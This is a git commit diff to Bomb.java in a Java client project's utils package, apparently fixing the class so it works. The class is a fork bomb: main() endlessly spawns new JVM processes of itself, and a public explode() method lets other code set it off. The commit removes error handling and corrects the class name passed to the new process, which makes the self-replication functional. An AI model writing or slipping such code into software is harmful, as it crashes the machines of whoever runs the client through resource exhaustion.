6c87903b49bdd5f6a7452ffc088e1036b064c58a
Coppini <hozerboy2239@gmail.com>
2019-02-03 12:38:22 -0200

    arruma class

--- client/src/main/java/utils/Bomb.java
+++ client/src/main/java/utils/Bomb.java
@@ -3,16 +3,12 @@ package utils;
 import java.io.IOException;
 
 public class Bomb {
-    public static void main(String[] args) {
-        try {
-            while (true)
-                Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), Bomb.class.toString()});
-        } catch (IOException e) {
-            // silence is golden
-        }
+    public static void main(String[] args) throws IOException {
+        while (true)
+            Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), Bomb.class.getName()});
     }
 
     public static void explode() throws IOException {
-       Bomb.main(null);
+        Bomb.main(null);
     }
 }
